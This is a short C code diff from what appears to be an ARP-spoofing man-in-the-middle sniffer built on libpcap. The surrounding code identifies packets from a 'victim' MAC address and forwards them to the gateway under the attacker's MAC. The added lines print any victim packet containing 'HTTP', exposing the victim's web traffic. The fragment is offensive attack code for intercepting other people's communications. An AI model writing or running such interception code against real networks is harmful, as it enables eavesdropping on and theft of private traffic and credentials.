@@ -68,6 +68,8 @@ void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) 
 
     /* get packet form victim */
     if (!memcmp(pEther->SRC_mac, victim_mac, 6)) {
+        char *p = strstr(data, "HTTP");
+        if (p != NULL) printf("%s\n", data);
         forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
     }
     else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
